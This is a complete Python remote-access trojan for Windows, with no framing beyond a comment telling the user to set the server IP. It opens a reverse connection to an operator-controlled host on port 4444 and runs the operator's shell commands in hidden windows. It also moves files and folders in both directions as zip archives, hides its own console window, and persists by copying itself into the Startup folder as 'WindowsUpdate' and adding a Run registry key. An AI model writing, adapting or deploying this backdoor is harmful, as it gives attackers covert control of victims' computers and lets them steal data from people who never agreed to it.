import socket
import os
import subprocess
import time
import zipfile
import io
import struct
import winreg
import shutil
import sys

HOST = 'Atreides'  # Change this to your server IP
PORT = 4444
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

def send_message(sock, message):
    """Send a length-prefixed message"""
    try:
        message_len = len(message)
        sock.send(struct.pack('!Q', message_len))
        
        total_sent = 0
        while total_sent < message_len:
            sent = sock.send(message[total_sent:total_sent + BUFFER_SIZE])
            if sent == 0:
                raise RuntimeError("Socket connection broken")
            total_sent += sent
            
    except Exception as e:
        raise RuntimeError(f"Send failed: {str(e)}")

def receive_message(sock):
    """Receive a length-prefixed message"""
    try:
        size_data = sock.recv(8)
        if not size_data:
            return None
        message_len = struct.unpack('!Q', size_data)[0]
        
        chunks = []
        bytes_received = 0
        while bytes_received < message_len:
            chunk = sock.recv(min(message_len - bytes_received, BUFFER_SIZE))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_received += len(chunk)
            
        return b''.join(chunks)
        
    except Exception as e:
        raise RuntimeError(f"Receive failed: {str(e)}")

def create_zip_file(path):
    """Create a zip file containing a directory"""
    temp_zip = io.BytesIO()
    with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if os.path.isfile(path):
            # Single file
            zipf.write(path, os.path.basename(path))
        else:
            # Directory
            for root, _, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(path))
                    zipf.write(file_path, arcname)
    return temp_zip.getvalue()

def extract_zip_file(zip_data, extract_path):
    """Extract a zip file to the specified path"""
    with io.BytesIO(zip_data) as zip_buffer:
        with zipfile.ZipFile(zip_buffer) as zip_file:
            zip_file.extractall(extract_path)

def handle_file_transfer(sock, path, mode='upload'):
    try:
        if mode == 'upload':
            # Receiving from server
            data = receive_message(sock)
            if not data:
                return "Transfer failed - no data received"
                
            parent_dir = os.path.dirname(path)
            if parent_dir:
                os.makedirs(parent_dir, exist_ok=True)
                
            try:
                # Try to extract as zip
                extract_zip_file(data, os.path.dirname(path) if os.path.dirname(path) else '.')
                return f"Successfully received directory to {path}"
            except zipfile.BadZipFile:
                # Not a zip, treat as single file
                with open(path, 'wb') as f:
                    f.write(data)
                return f"Successfully received file {path}"
                
        else:  # download
            if not os.path.exists(path):
                return f"Path {path} does not exist"
                
            # Create zip for both files and directories
            zip_data = create_zip_file(path)
            send_message(sock, zip_data)
            
            return f"Successfully sent {'directory' if os.path.isdir(path) else 'file'} {path}"
            
    except Exception as e:
        return f"Transfer failed: {str(e)}"

def execute_command(command):
    try:
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        try:
            stdout, stderr = process.communicate(timeout=30)
            if stderr:
                return stderr
            return stdout if stdout else "Command executed successfully"
        except subprocess.TimeoutExpired:
            process.kill()
            return "Command execution timed out"
            
    except Exception as e:
        return str(e)

def add_to_startup():
    try:
        # Get the path of the current script
        if getattr(sys, 'frozen', False):
            # If running as exe
            script_path = sys.executable
        else:
            # If running as .py
            script_path = os.path.abspath(__file__)
            
        # Create startup directory if it doesn't exist
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        os.makedirs(startup_path, exist_ok=True)
        
        # Copy script to startup folder
        startup_file = os.path.join(
            startup_path, 
            "WindowsUpdate.exe" if getattr(sys, 'frozen', False) else "WindowsUpdate.pyw"
        )
        
        # Only copy if not already in startup
        if os.path.abspath(script_path) != os.path.abspath(startup_file):
            shutil.copy2(script_path, startup_file)
            
        # Add registry entry for persistence
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, startup_file)
        winreg.CloseKey(key)
        
        return True
    except Exception as e:
        print(f"Failed to add to startup: {e}")
        return False

def connect():
    while True:
        try:
            sock = socket.socket()
            sock.connect((HOST, PORT))
            cwd = os.getcwd().encode()
            send_message(sock, cwd)
            return sock
        except Exception as e:
            print(f"Connection failed: {e}")
            time.sleep(1)

def main():
    sock = connect()
    
    while True:
        try:
            command_bytes = receive_message(sock)
            if not command_bytes:
                raise RuntimeError("Connection lost")
                
            command = command_bytes.decode()
            
            if command.lower() == "exit":
                sock.close()
                sock = connect()
                continue
                
            split_command = command.split()
            command_type = split_command[0].lower() if split_command else ""
            
            if command_type == "cd":
                try:
                    os.chdir(' '.join(split_command[1:]))
                    output = ""
                except Exception as e:
                    output = str(e)
                    
            elif command_type in ("upload", "download"):
                if len(split_command) < 2:
                    output = "Missing file path"
                else:
                    output = handle_file_transfer(
                        sock, 
                        split_command[1],
                        command_type
                    )
                    
            else:
                output = execute_command(command)
            
            message = f"{output}{SEPARATOR}{os.getcwd()}".encode()
            send_message(sock, message)
            
        except Exception as e:
            print(f"Error: {e}")
            sock.close()
            sock = connect()

if __name__ == "__main__":
    try:
        # Try to hide the window if running as executable
        import ctypes
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        get_console = kernel32.GetConsoleWindow()
        if get_console != 0:
            user32.ShowWindow(get_console, 0)
            kernel32.CloseHandle(get_console)
    except:
        pass
        
    main()
